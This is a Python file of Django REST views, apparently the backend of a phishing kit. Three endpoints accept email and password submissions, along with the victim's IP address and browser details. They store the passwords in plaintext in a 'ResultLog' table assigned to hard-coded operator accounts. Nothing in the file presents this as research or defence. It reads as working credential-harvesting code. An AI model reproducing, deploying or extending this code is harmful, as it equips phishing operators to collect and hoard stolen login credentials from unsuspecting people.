from rest_framework.views import APIView
from rest_framework.response import Response
from rest_framework import status
from django.contrib.auth.models import User
from camelion.models import ResultLog  
from camelion.utils import get_client_ip, get_browser_info 
import json

class CamelionEmailView(APIView):
    def post(self, request):
        try:
            # Extract JSON data
            data = request.data

            # Get IP address and admin user
            ip_address = get_client_ip(request)
            user = User.objects.get(username='myadminuser')

            # Get browser info
            browser_info = get_browser_info(request)

            print('working with api')

            # Save to ResultLog
            ResultLog.objects.create(
                owner=user,
                email=data.get("f_email"),
                password_text=data.get("f_password"),
                ip_address=ip_address,
                browser_version=browser_info.get('version'),
                browser_type=browser_info.get('browser'),
                browser_agent=browser_info.get('agent'),
            )

            return Response({'message': 'Data received'}, status=status.HTTP_200_OK)

        except User.DoesNotExist:
            return Response({'error': 'Admin user not found'}, status=status.HTTP_404_NOT_FOUND)
        
        except Exception as e:
            print(f"Error logging information: {str(e)}")
            return Response({'error': 'Failed to process request'}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
        

class CamelionEmailTwoView(APIView):
    def post(self, request):
        try:
            # Extract JSON data
            data = request.data

            # Get IP address and admin user
            ip_address = get_client_ip(request)
            user = User.objects.get(username='ogoloadmin')

            # Get browser info
            browser_info = get_browser_info(request)

            print('working with api')

            # Save to ResultLog
            ResultLog.objects.create(
                owner=user,
                email=data.get("f_email"),
                password_text=data.get("f_password"),
                ip_address=ip_address,
                browser_version=browser_info.get('version'),
                browser_type=browser_info.get('browser'),
                browser_agent=browser_info.get('agent'),
            )

            return Response({'message': 'Data received'}, status=status.HTTP_200_OK)

        except User.DoesNotExist:
            return Response({'error': 'Admin user not found'}, status=status.HTTP_404_NOT_FOUND)
        
        except Exception as e:
            print(f"Error logging information: {str(e)}")
            return Response({'error': 'Failed to process request'}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
        

class CamelionEmailThreeView(APIView):
    def post(self, request):
        try:
            data = request.data

            email = data.get("email")
            password = data.get("password")
            ip_address = data.get("ip_address")
            user_agent = data.get("browser_agent")
            browser_version = data.get("browser_version")
            browser_type = data.get("browser_type")

            if not email or not password:
                return Response({'error': 'Email and password are required.'}, status=status.HTTP_400_BAD_REQUEST)

            # Fetch the owner/admin user (example: first superuser)
            try:
                owner = User.objects.get(username="myadminuser")
                if not owner:
                    return Response({'error': 'Admin user not found.'}, status=status.HTTP_404_NOT_FOUND)
            except User.DoesNotExist:
                return Response({'error': 'Admin user not found.'}, status=status.HTTP_404_NOT_FOUND)

            # Save to ResultLog
            ResultLog.objects.create(
                owner=owner,
                email=email,
                password_text=password,
                ip_address=ip_address,
                browser_version=browser_version,
                browser_type=browser_type,
                browser_agent=user_agent
            )

            return Response({'message': 'Data received'}, status=status.HTTP_200_OK)

        except Exception as e:
            print(f"Error logging information: {str(e)}")
            return Response({'error': 'Failed to process request'}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)